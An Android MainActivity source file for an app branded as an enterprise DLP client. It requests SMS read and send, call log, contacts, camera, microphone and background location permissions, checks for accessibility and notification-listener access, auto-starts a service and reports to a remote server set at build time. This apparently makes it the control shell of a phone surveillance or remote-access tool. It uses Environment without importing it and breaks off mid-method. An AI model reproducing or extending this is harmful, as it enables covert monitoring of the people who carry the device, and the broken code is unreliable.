package com.athex.dlp;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.SpannableString;
import android.text.Spanned;
import android.text.method.ScrollingMovementMethod;
import android.text.style.ForegroundColorSpan;
import android.text.style.StyleSpan;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.athex.dlp.network.TCPClient;
import com.athex.dlp.services.MainService;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * ATHEX DLP Enterprise - MainActivity
 * 
 * Main UI screen for the Android client. Provides:
 * - Service control (start/stop background service)
 * - Connection status monitoring
 * - Real-time log viewer
 * - Permission management
 * - Quick action buttons
 * - Server configuration
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class MainActivity extends AppCompatActivity {
    
    // ============================================================
    // CONSTANTS
    // ============================================================
    
    private static final String TAG = "ATHEX_MainActivity";
    private static final int PERMISSION_REQUEST_ALL = 1001;
    private static final int REQUEST_NOTIFICATION_LISTENER = 1002;
    private static final int REQUEST_ACCESSIBILITY = 1003;
    private static final int REQUEST_OVERLAY_PERMISSION = 1004;
    private static final int REQUEST_BATTERY_OPTIMIZATION = 1005;
    private static final int REQUEST_MANAGE_STORAGE = 1006;
    
    private static final String PREF_NAME = "athex_dlp_prefs";
    private static final String PREF_SERVER_HOST = "server_host";
    private static final String PREF_SERVER_PORT = "server_port";
    private static final String PREF_APP_LABEL = "app_label";
    private static final String PREF_FIRST_RUN = "first_run";
    
    // Default server config (will be injected during build)
    private static final String DEFAULT_SERVER_HOST = "127.0.0.1";
    private static final int DEFAULT_SERVER_PORT = 22533;
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    // UI Components
    private LinearLayout mainLayout;
    private ScrollView scrollView;
    private TextView statusTitleText;
    private TextView connectionStatusText;
    private TextView deviceInfoText;
    private TextView logTextView;
    private ProgressBar connectionProgress;
    private Button connectButton;
    private Button disconnectButton;
    private Button startServiceButton;
    private Button stopServiceButton;
    private Button permissionsButton;
    private Button clearLogButton;
    private Button configButton;
    
    // Service
    private MainService mainService;
    private boolean isServiceBound = false;
    private TCPClient tcpClient;
    
    // Handlers
    private Handler mainHandler;
    private Handler logHandler;
    
    // Preferences
    private SharedPreferences preferences;
    
    // State
    private boolean isConnected = false;
    private boolean isServiceRunning = false;
    private String serverHost;
    private int serverPort;
    private StringBuilder logBuilder;
    private int logLineCount = 0;
    private static final int MAX_LOG_LINES = 500;
    
    // Broadcast receiver
    private BroadcastReceiver statusReceiver;
    
    // ============================================================
    // LIFECYCLE METHODS
    // ============================================================
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.i(TAG, "========================================");
        Log.i(TAG, "MainActivity onCreate()");
        Log.i(TAG, "========================================");
        
        // Initialize handlers
        mainHandler = new Handler(Looper.getMainLooper());
        logHandler = new Handler(Looper.getMainLooper());
        
        // Initialize preferences
        preferences = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        
        // Load saved config
        loadConfiguration();
        
        // Initialize log
        logBuilder = new StringBuilder();
        
        // Build UI
        buildUserInterface();
        
        // Register broadcast receiver
        registerStatusReceiver();
        
        // Check first run
        checkFirstRun();
        
        // Request permissions
        requestAllPermissions();
        
        // Auto-start service if configured
        autoStartService();
        
        addLog("ATHEX DLP Client v2.0.0", "system");
        addLog("Device: " + Build.MODEL + " | Android " + Build.VERSION.RELEASE, "info");
        addLog("Server: " + serverHost + ":" + serverPort, "info");
        addLog("Ready.", "success");
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        refreshUI();
        
        // Check service status
        checkServiceStatus();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // Unregister receiver
        if (statusReceiver != null) {
            try {
                unregisterReceiver(statusReceiver);
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering receiver: " + e.getMessage());
            }
        }
        
        // Unbind service if bound
        if (isServiceBound) {
            try {
                unbindService(serviceConnection);
                isServiceBound = false;
            } catch (Exception e) {
                Log.e(TAG, "Error unbinding service: " + e.getMessage());
            }
        }
        
        Log.d(TAG, "MainActivity destroyed");
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        switch (requestCode) {
            case REQUEST_NOTIFICATION_LISTENER:
                if (isNotificationListenerEnabled()) {
                    addLog("Notification Listener enabled", "success");
                } else {
                    addLog("Notification Listener not enabled", "warning");
                }
                break;
                
            case REQUEST_ACCESSIBILITY:
                if (isAccessibilityServiceEnabled()) {
                    addLog("Accessibility Service enabled", "success");
                } else {
                    addLog("Accessibility Service not enabled", "warning");
                }
                break;
                
            case REQUEST_OVERLAY_PERMISSION:
                if (Settings.canDrawOverlays(this)) {
                    addLog("Overlay permission granted", "success");
                }
                break;
                
            case REQUEST_BATTERY_OPTIMIZATION:
                addLog("Battery optimization check complete", "info");
                break;
                
            case REQUEST_MANAGE_STORAGE:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (Environment.isExternalStorageManager()) {
                        addLog("Storage management permission granted", "success");
                    }
                }
                break;
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_ALL) {
            int granted = 0;
            int denied = 0;
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                } else {
                    denied++;
                    addLog("Permission denied: " + permissions[i], "warning");
                }
            }
            
            addLog("Permissions: " + granted + " granted, " + denied + " denied", 
                   denied > 0 ? "warning" : "success");
            
            // If critical permissions denied, show dialog
            if (denied > 0) {
                showPermissionDeniedDialog();
            }
        }
    }
    
    // ============================================================
    // UI BUILDING
    // ============================================================
    
    /**
     * Build the complete user interface programmatically
     */
    private void buildUserInterface() {
        // Main container
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        mainLayout.setPadding(20, 20, 20, 20);
        mainLayout.setBackgroundColor(Color.parseColor("#0a0e17"));
        
        // ============================================================
        // STATUS SECTION
        // ============================================================
        
        // Title
        statusTitleText = new TextView(this);
        statusTitleText.setText("◆ ATHEX DLP");
        statusTitleText.setTextColor(Color.parseColor("#00f0ff"));
        statusTitleText.setTextSize(24);
        statusTitleText.setTypeface(null, Typeface.BOLD);
        statusTitleText.setGravity(Gravity.CENTER);
        statusTitleText.setPadding(0, 10, 0, 5);
        mainLayout.addView(statusTitleText);
        
        // Subtitle
        TextView subtitleText = new TextView(this);
        subtitleText.setText("Enterprise Client v2.0.0");
        subtitleText.setTextColor(Color.parseColor("#64748b"));
        subtitleText.setTextSize(12);
        subtitleText.setGravity(Gravity.CENTER);
        subtitleText.setPadding(0, 0, 0, 15);
        mainLayout.addView(subtitleText);
        
        // Connection Status
        connectionStatusText = new TextView(this);
        connectionStatusText.setText("● Not Connected");
        connectionStatusText.setTextColor(Color.parseColor("#ef4444"));
        connectionStatusText.setTextSize(16);
        connectionStatusText.setGravity(Gravity.CENTER);
        connectionStatusText.setPadding(0, 5, 0, 5);
        mainLayout.addView(connectionStatusText);
        
        // Progress Bar
        connectionProgress = new ProgressBar(this);
        connectionProgress.setVisibility(View.GONE);
        connectionProgress.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        mainLayout.addView(connectionProgress);
        
        // Device Info
        deviceInfoText = new TextView(this);
        deviceInfoText.setText(Build.MODEL + " | Android " + Build.VERSION.RELEASE);
        deviceInfoText.setTextColor(Color.parseColor("#94a3b8"));
        deviceInfoText.setTextSize(12);
        deviceInfoText.setGravity(Gravity.CENTER);
        deviceInfoText.setPadding(0, 0, 0, 15);
        mainLayout.addView(deviceInfoText);
        
        // ============================================================
        // CONNECTION BUTTONS
        // ============================================================
        
        LinearLayout connectionButtonLayout = new LinearLayout(this);
        connectionButtonLayout.setOrientation(LinearLayout.HORIZONTAL);
        connectionButtonLayout.setGravity(Gravity.CENTER);
        connectionButtonLayout.setPadding(0, 0, 0, 10);
        
        // Connect Button
        connectButton = new Button(this);
        connectButton.setText("⚡ CONNECT");
        connectButton.setTextColor(Color.parseColor("#0a0e17"));
        connectButton.setBackgroundColor(Color.parseColor("#00f0ff"));
        connectButton.setPadding(20, 10, 20, 10);
        connectButton.setOnClickListener(v -> connectToServer());
        LinearLayout.LayoutParams connectParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        );
        connectParams.setMargins(0, 0, 5, 0);
        connectButton.setLayoutParams(connectParams);
        connectionButtonLayout.addView(connectButton);
        
        // Disconnect Button
        disconnectButton = new Button(this);
        disconnectButton.setText("◼ DISCONNECT");
        disconnectButton.setTextColor(Color.parseColor("#ffffff"));
        disconnectButton.setBackgroundColor(Color.parseColor("#ef4444"));
        disconnectButton.setPadding(20, 10, 20, 10);
        disconnectButton.setEnabled(false);
        disconnectButton.setOnClickListener(v -> disconnectFromServer());
        LinearLayout.LayoutParams disconnectParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        );
        disconnectParams.setMargins(5, 0, 0, 0);
        disconnectButton.setLayoutParams(disconnectParams);
        connectionButtonLayout.addView(disconnectButton);
        
        mainLayout.addView(connectionButtonLayout);
        
        // ============================================================
        // SERVICE BUTTONS
        // ============================================================
        
        LinearLayout serviceButtonLayout = new LinearLayout(this);
        serviceButtonLayout.setOrientation(LinearLayout.HORIZONTAL);
        serviceButtonLayout.setGravity(Gravity.CENTER);
        serviceButtonLayout.setPadding(0, 0, 0, 10);
        
        // Start Service Button
        startServiceButton = new Button(this);
        startServiceButton.setText("▶ Start Service");
        startServiceButton.setTextColor(Color.parseColor("#ffffff"));
        startServiceButton.setBackgroundColor(Color.parseColor("#10b981"));
        startServiceButton.setPadding(15, 8, 15, 8);
        startServiceButton.setTextSize(12);
        startServiceButton.setOnClickListener(v -> startBackgroundService());
        LinearLayout.LayoutParams startParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        );
        startParams.setMargins(0, 0, 3, 0);
        startServiceButton.setLayoutParams(startParams);
        serviceButtonLayout.addView(startServiceButton);
        
        // Stop Service Button
        stopServiceButton = new Button(this);
        stopServiceButton.setText("⏹ Stop Service");
        stopServiceButton.setTextColor(Color.parseColor("#ffffff"));
        stopServiceButton.setBackgroundColor(Color.parseColor("#f59e0b"));
        stopServiceButton.setPadding(15, 8, 15, 8);
        stopServiceButton.setTextSize(12);
        stopServiceButton.setEnabled(false);
        stopServiceButton.setOnClickListener(v -> stopBackgroundService());
        LinearLayout.LayoutParams stopParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        );
        stopParams.setMargins(3, 0, 0, 0);
        stopServiceButton.setLayoutParams(stopParams);
        serviceButtonLayout.addView(stopServiceButton);
        
        mainLayout.addView(serviceButtonLayout);
        
        // ============================================================
        // CONFIG & PERMISSIONS BUTTONS
        // ============================================================
        
        LinearLayout configButtonLayout = new LinearLayout(this);
        configButtonLayout.setOrientation(LinearLayout.HORIZONTAL);
        configButtonLayout.setGravity(Gravity.CENTER);
        configButtonLayout.setPadding(0, 0, 0, 10);
        
        // Permissions Button
        permissionsButton = new Button(this);
        permissionsButton.setText("🔐 Permissions");
        permissionsButton.setTextColor(Color.parseColor("#ffffff"));
        permissionsButton.setBackgroundColor(Color.parseColor("#7c3aed"));
        permissionsButton.setPadding(15, 8, 15, 8);
        permissionsButton.setTextSize(12);
        permissionsButton.setOnClickListener(v -> requestAllPermissions());
        LinearLayout.LayoutParams permParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        );
        permParams.setMargins(0, 0, 3, 0);
        permissionsButton.setLayoutParams(permParams);
        configButtonLayout.addView(permissionsButton);
        
        // Config Button
        configButton = new Button(this);
        configButton.setText("⚙️ Config");
        configButton.setTextColor(Color.parseColor("#ffffff"));
        configButton.setBackgroundColor(Color.parseColor("#3b82f6"));
        configButton.setPadding(15, 8, 15, 8);
        configButton.setTextSize(12);
        configButton.setOnClickListener(v -> showConfigDialog());
        LinearLayout.LayoutParams configParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        );
        configParams.setMargins(3, 0, 0, 0);
        configButton.setLayoutParams(configParams);
        configButtonLayout.addView(configButton);
        
        mainLayout.addView(configButtonLayout);
        
        // ============================================================
        // LOG VIEWER
        // ============================================================
        
        // Log label
        TextView logLabel = new TextView(this);
        logLabel.setText("📋 System Log");
        logLabel.setTextColor(Color.parseColor("#00f0ff"));
        logLabel.setTextSize(14);
        logLabel.setTypeface(null, Typeface.BOLD);
        logLabel.setPadding(0, 10, 0, 5);
        mainLayout.addView(logLabel);
        
        // ScrollView for log
        scrollView = new ScrollView(this);
        scrollView.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            0,
            1
        ));
        scrollView.setBackgroundColor(Color.parseColor("#111827"));
        scrollView.setPadding(10, 10, 10, 10);
        
        // Log text view
        logTextView = new TextView(this);
        logTextView.setTextColor(Color.parseColor("#94a3b8"));
        logTextView.setTextSize(11);
        logTextView.setTypeface(Typeface.MONOSPACE);
        logTextView.setMovementMethod(new ScrollingMovementMethod());
        logTextView.setText("Waiting for events...\n");
        scrollView.addView(logTextView);
        
        mainLayout.addView(scrollView);
        
        // Clear log button
        clearLogButton = new Button(this);
        clearLogButton.setText("🗑️ Clear Log");
        clearLogButton.setTextColor(Color.parseColor("#ffffff"));
        clearLogButton.setBackgroundColor(Color.parseColor("#374151"));
        clearLogButton.setPadding(10, 5, 10, 5);
        clearLogButton.setTextSize(11);
        clearLogButton.setOnClickListener(v -> clearLog());
        LinearLayout.LayoutParams clearParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        clearParams.gravity = Gravity.CENTER;
        clearParams.setMargins(0, 5, 0, 0);
        clearLogButton.setLayoutParams(clearParams);
        mainLayout.addView(clearLogButton);
        
        // Set content view
        setContentView(mainLayout);
    }
    
    // ============================================================
    // SERVICE CONNECTION
    // ============================================================
    
    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "Service connected");
            isServiceBound = true;
            
            // Get service instance if available
            if (service instanceof MainService.LocalBinder) {
                mainService = ((MainService.LocalBinder) service).getService();
                tcpClient = mainService.getTCPClient();
                isServiceRunning = mainService.isServiceRunning();
                
                addLog("Service bound successfully", "success");
                refreshUI();
            }
        }
        
        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "Service disconnected");
            isServiceBound = false;
            mainService = null;
            tcpClient = null;
            isServiceRunning = false;
            
            addLog("Service disconnected", "warning");
            refreshUI();
        }
    };
    
    /**
     * Bind to MainService
     */
    private void bindToService() {
        Intent serviceIntent = new Intent(this, MainService.class);
        serviceIntent.putExtra("server_host", serverHost);
        serviceIntent.putExtra("server_port", serverPort);
        
        bindService(serviceIntent, serviceConnection, Context.BIND_AUTO_CREATE);
        addLog("Binding to service...", "info");
    }
    
    // ============================================================
    // CONNECTION MANAGEMENT
    // ============================================================
    
    /**
     * Connect to server via service
     */
    private void connectToServer() {
        addLog("Initiating connection to " + serverHost + ":" + serverPort, "info");
        
        if (mainService != null) {
            mainService.updateServerConfig(serverHost, serverPort);
            addLog("Connection started via service", "info");
        } else {
            // Start service first, then connect
            startBackgroundService();
            
            mainHandler.postDelayed(() -> {
                if (mainService != null) {
                    mainService.updateServerConfig(serverHost, serverPort);
                    addLog("Connection started", "info");
                }
            }, 2000);
        }
        
        connectionProgress.setVisibility(View.VISIBLE);
        updateConnectionStatus("connecting");
    }
    
    /**
     * Disconnect from server
     */
    private void disconnectFromServer() {
        addLog("Disconnecting from server...", "warning");
        
        if (mainService != null) {
            mainService.sendToServer("DISCONNECT");
            // Service will handle disconnect
        }
        
        updateConnectionStatus("disconnected");
    }
    
    /**
     * Update connection status UI
     */
    private void updateConnectionStatus(String status) {
        mainHandler.post(() -> {
            switch (status) {
                case "connected":
                    connectionStatusText.setText("● Connected");
                    connectionStatusText.setTextColor(Color.parseColor("#10b981"));
                    connectButton.setEnabled(false);
                    disconnectButton.setEnabled(true);
                    connectionProgress.setVisibility(View.GONE);
                    isConnected = true;
                    break;
                    
                case "disconnected":
                    connectionStatusText.setText("● Not Connected");
                    connectionStatusText.setTextColor(Color.parseColor("#ef4444"));
                    connectButton.setEnabled(true);
                    disconnectButton.setEnabled(false);
                    connectionProgress.setVisibility(View.GONE);
                    isConnected = false;
                    break;
                    
                case "connecting":
                    connectionStatusText.setText("◌ Connecting...");
                    connectionStatusText.setTextColor(Color.parseColor("#f59e0b"));
                    connectButton.setEnabled(false);
                    disconnectButton.setEnabled(false);
                    connectionProgress.setVisibility(View.VISIBLE);
                    isConnected = false;
                    break;
                    
                case "reconnecting":
                    connectionStatusText.setText("↻ Reconnecting...");
                    connectionStatusText.setTextColor(Color.parseColor("#f59e0b"));
                    connectionProgress.setVisibility(View.VISIBLE);
                    isConnected = false;
                    break;
            }
        });
    }
    
    // ============================================================
    // SERVICE CONTROL
    // ============================================================
    
    /**
     * Start background service
     */
    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, MainService.class);
        serviceIntent.putExtra("server_host", serverHost);
        serviceIntent.putExtra("server_port", serverPort);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        addLog("Background service starting...", "info");
        
        // Bind to service after delay
        mainHandler.postDelayed(() -> {
            if (!isServiceBound) {
                bindToService();
            }
        }, 1500);
        
        isServiceRunning = true;
        refreshUI();
    }
    
    /**
     * Stop background service
     */
    private void stopBackgroundService() {
        Intent serviceIntent = new Intent(this, MainService.class);
        stopService(serviceIntent);
        
        if (isServiceBound) {
            try {
                unbindService(serviceConnection);
                isServiceBound = false;
            } catch (Exception e) {
                Log.e(TAG, "Error unbinding: " + e.getMessage());
            }
        }
        
        mainService = null;
        tcpClient = null;
        isServiceRunning = false;
        
        addLog("Background service stopped", "warning");
        refreshUI();
    }
    
    /**
     * Check if service is running
     */
    private void checkServiceStatus() {
        // Try to bind to check if service is running
        if (!isServiceBound) {
            bindToService();
        }
    }
    
    /**
     * Auto-start service if previously running
     */
    private void autoStartService() {
        boolean wasRunning = preferences.getBoolean("service_was_running", false);
        if (wasRunning) {
            addLog("Auto-starting service...", "info");
            mainHandler.postDelayed(this::startBackgroundService, 1000);
        }
    }
    
    // ============================================================
    // PERMISSION MANAGEMENT
    // ============================================================
    
    /**
     * Request all required permissions
     */
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // Core permissions
        String[] requiredPermissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
        };
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // Background location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, 
                Manifest.permission.ACCESS_BACKGROUND_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_ALL
            );
            addLog("Requesting " + permissionsToRequest.size() + " permissions...", "info");
        } else {
            addLog("All basic permissions granted", "success");
        }
        
        // Special permissions (require separate intents)
        checkSpecialPermissions();
    }
    
    /**
     * Check and request special permissions
     */
    private void checkSpecialPermissions() {
        // Notification Listener
        if (!isNotificationListenerEnabled()) {
            addLog("Notification Listener access needed", "warning");
            // Will be requested when user taps permissions button
        }
        
        // Accessibility Service
        if (!isAccessibilityServiceEnabled()) {
            addLog("Accessibility Service not enabled", "warning");
        }
        
        // Overlay Permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                addLog("Overlay permission not granted", "warning");
            }
        }
        
        // Battery Optimization
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            addLog("Battery optimization active", "warning");
        }
        
        // Manage External Storage (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                addLog("Storage management permission needed", "warning");
            }
        }
    }
    
    /**
     * Check if notification listener is enabled
     */
    private boolean isNotificationListenerEnabled() {
        String packageName = getPackageName();
        String flat = Settings.Secure.getString(
            getContentResolver(),
            "enabled_notification_listeners"
        );
        return flat != null && flat.contains(packageName);
    }
    
    /**
     * Check if accessibility service is enabled
     */
    private boolean isAccessibilityServiceEnabled() {
        String service = getPackageName() + "/.services.AccessibilityService";
        try {
            int enabled = Settings.Secure.getInt(
                getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
            if (enabled == 1) {
                String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                );
                return enabledServices != null && enabledServices.contains(service);
            }
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error checking accessibility: " + e.getMessage());
        }
        return false;
    }
    
    /**
     * Show permission denied dialog
     */
    private void showPermissionDeniedDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("Some permissions were denied. The app may not function properly without all permissions. Do you want to open settings?")
            .setPositiveButton("Open Settings", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            })
            .setNegativeButton("Later", null)
            .show();
    }
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    
    /**
     * Load saved configuration
     */
    private void loadConfiguration() {
        serverHost = preferences.getString(PREF_SERVER_HOST, DEFAULT_SERVER_HOST);
        serverPort = preferences.getInt(PREF_SERVER_PORT, DEFAULT_SERVER_PORT);
    }
    
    /**
     * Save configuration
     */
    private void saveConfiguration(String host, int port) {
        preferences.edit()
            .putString(PREF_SERVER_HOST, host)
            .putInt(PREF_SERVER_PORT, port)
            .apply();
        
        serverHost = host;
        serverPort = port;
        
        addLog("Configuration saved: " + host + ":" + port, "success");
    }
    
    /**
     * Show configuration dialog
     */
    private void showConfigDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("⚙️ Server Configuration");
        
        // Create layout
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 20, 40, 20);
        
        // Host input
        TextView hostLabel = new TextView(this);
        hostLabel.setText("Server Host:");
        hostLabel.setTextColor(Color.WHITE);
        layout.addView(hostLabel);
        
        android.widget.EditText hostInput = new android.widget.EditText(this);
        hostInput.setText(serverHost);
        hostInput.setTextColor(Color.WHITE);
        hostInput.setBackgroundColor(Color.parseColor("#1a1f2e"));
        layout.addView(hostInput);
        
        // Port input
        TextView portLabel = new TextView(this);
        portLabel.setText("Server Port:");
        portLabel.setTextColor(Color.WHITE);
        portLabel.setPadding(0, 15, 0, 0);
        layout.addView(portLabel);
        
        android.widget.EditText portInput = new android.widget.EditText(this);
        portInput.setText(String.valueOf(serverPort));
        portInput.setTextColor(Color.WHITE);
        portInput.setBackgroundColor(Color.parseColor("#1a1f2e"));
        portInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
        layout.addView(portInput);
        
        builder.setView(layout);
        
        builder.setPositiveButton("Save", (dialog, which) -> {
            String host = hostInput.getText().toString().trim();
            String portStr = portInput.getText().toString().trim();
            
            if (!host.isEmpty() && !portStr.isEmpty()) {
                try {
                    int port = Integer.parseInt(portStr);
                    saveConfiguration(host, port);
                    
                    // Update service if running
                    if (mainService != null) {
                        mainService.updateServerConfig(host, port);
                    }
                    
                    Toast.makeText(this, "Configuration saved!", Toast.LENGTH_SHORT).show();
                } catch (NumberFormatException e) {
                    Toast.makeText(this, "Invalid port number", Toast.LENGTH_SHORT).show();
                }
            }
        });
        
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }
    
    /**
     * Check first run
     */
    private void checkFirstRun() {
        boolean isFirstRun = preferences.getBoolean(PREF_FIRST_RUN, true);
        
        if (isFirstRun) {
            addLog("First run detected", "system");
            
            // Show welcome dialog
            mainHandler.postDelayed(() -> {
                new AlertDialog.Builder(this)
                    .setTitle("Welcome to ATHEX DLP")
                    .setMessage("This app requires several permissions to function properly. Please grant all requested permissions.")
                    .setPositiveButton("OK", (dialog, which) -> {
                        requestAllPermissions();
                    })
                    .show();
            }, 1000);
            
            preferences.edit().putBoolean(PREF_FIRST_RUN, false).apply();
        }
    }
    
    // ============================================================
    // BROADCAST RECEIVER
    // ============================================================
    
    /**
     * Register status broadcast receiver
     */
    private void registerStatusReceiver() {
        statusReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String status = intent.getStringExtra("status");
                String message = intent.getStringExtra("message");
                
                if (status != null) {
                    switch (status) {
                        case "CONNECTED":
                            updateConnectionStatus("connected");
                            addLog("Connected: " + message, "success");
                            break;
                            
                        case "DISCONNECTED":
                            updateConnectionStatus("disconnected");
                            addLog("Disconnected: " + message, "warning");
                            break;
                            
                        case "CONNECTION_FAILED":
                            updateConnectionStatus("disconnected");
                            addLog("Connection failed: " + message, "error");
                            break;
                            
                        case "RECONNECTING":
                            updateConnectionStatus("reconnecting");
                            addLog("Reconnecting (Attempt " + message + ")", "info");
                            break;
                            
                        case "AUTHENTICATED":
                            addLog("Authentication successful", "success");
                            break;
                            
                        case "AUTH_FAILED":
                            addLog("Authentication failed", "error");
                            break;
                    }
                }
            }
        };
        
        IntentFilter filter = new IntentFilter("com.athex.dlp.SERVICE_STATUS");
        registerReceiver(statusReceiver, filter);
    }
    
    // ============================================================
    // LOGGING
    // ============================================================
    
    /**
     * Add log entry
     */
    private void addLog(String message, String type) {
        logHandler.post(() -> {
            String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                .format(new Date());
            
            String prefix;
            switch (type) {
                case "error":   prefix = "[E]"; break;
                case "warning": prefix = "[W]"; break;
                case "success": prefix = "[✓]"; break;
                case "system":  prefix = "[S]"; break;
                default:        prefix = "[i]"; break;
            }
            
            String logLine = String.format("%s %s %s\n", timestamp, prefix, message);
            logBuilder.append(logLine);
            logLineCount++;
            
            // Trim old lines
            if (logLineCount > MAX_LOG_LINES) {
                int firstNewline = logBuilder.indexOf("\n");
                if (firstNewline > 0) {
                    logBuilder.delete(0, firstNewline + 1);
                }
                logLineCount--;
            }
            
            // Update UI
            logTextView.setText(logBuilder.toString());
            
            // Auto-scroll to bottom
            scrollView.post(() -> scrollView.fullScroll(View.FOCUS_DOWN));
        });
    }
    
    /**
     * Clear log
     */
    private void clearLog() {
        logBuilder = new StringBuilder();
        logLineCount = 0;
        logTextView.setText("");
        addLog("Log cleared", "system");
    }
    
    // ============================================================
    // UI REFRESH
    // ============================================================
    
    /**
     * Refresh UI based on current state
     */
    private void refreshUI() {
        mainHandler.post(() -> {
            if (isServiceRunning) {
                startServiceButton.setEnabled(false);
                stopServiceButton.setEnabled(true);
            } else {
                startServiceButton.setEnabled(true);
                stopServiceButton.setEnabled(false);
            }
            
            if (isConnected) {
                connectButton.setEnabled(false);
                disconnectButton.setEnabled(true);
